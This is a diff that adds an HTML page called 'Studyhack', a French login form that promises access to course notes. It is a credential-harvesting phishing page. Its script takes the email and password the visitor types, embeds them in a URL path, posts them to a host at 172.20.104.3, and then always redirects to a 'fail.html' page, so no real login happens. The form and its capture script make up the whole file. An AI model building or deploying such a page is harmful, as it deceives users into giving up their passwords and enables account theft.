@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <title>Studyhack</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <div class="container">
+            <form id="form">
+                <!-- Email input -->
+                <div class="form-outline mb-4">
+                  <input type="email" id="email" class="form-control" />
+                  <label class="form-label" for="form1Example1">Adresse email</label>
+                </div>
+              
+                <!-- Password input -->
+                <div class="form-outline mb-4">
+                  <input type="password" id="mdp" class="form-control" />
+                  <label class="form-label" for="form1Example2">Mot de passe</label>
+                </div>
+              
+                <!-- Submit button -->
+                <button type="submit" class="btn btn-primary btn-block">Accéder aux CMs !</button>
+                <p>Si vous n'avez pas de compte, il sera créé et vous serez connecté(e) immédiatement après avoir entré un mail et un mot de passe</p>
+              </form>
+        </div>
+    </body>
+</html>
+
+
+<script>
+  document.getElementById('form').addEventListener('submit', function (e) {
+  e.preventDefault(); // Empêche la soumission du formulaire par défaut
+
+  var emailinput = document.getElementById("email");
+  var emailValue = emailinput.value;
+  var passwordInput = document.getElementById("mdp");
+  var passwordValue = passwordInput.value;
+
+  apiUrl = 'http://172.20.104.3:3000/tadam/' + emailValue + "/" + passwordValue
+  console.log(apiUrl)
+  fetch(apiUrl , {
+    method: 'POST',
+  })
+  .then(data => {
+    // Effectuez la redirection une fois que la réponse de l'API est traitée
+    window.location.href = 'fail.html';
+  })
+    .catch(error => {
+      // Gérez les erreurs en cas d'échec de l'appel API
+      console.error('Erreur lors de l\'appel API : ' + error);
+    });
+});
+</script>
+
+<style>
+  body {
+  margin:0;
+  padding:0;
+  font-family: sans-serif;
+  background: linear-gradient(#141e30, #243b55);
+}
+.container{
+    width: 100vw;
+    height: 100vh;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+}
+form{
+    width: 50vw;
+    padding: 20px;
+    color: white;
+    border: 1px solid black;
+    box-shadow: 8px 8px 8px #162435;
+    border-radius: 15px;
+}
+form p{
+  font-style: italic;font-size: 15px;
+}
+@media screen and (max-device-width: 600px) {
+form{
+    width: 100%;
+    font-size: 45px;
+}
+form p{
+  font-size: 25px;
+  margin-top: 5px;
+}
+.btn{
+  font-size: 30px;
+  padding: 12px; 
+}
+.form-control{
+  padding: 20px;
+}
+}
+</style>
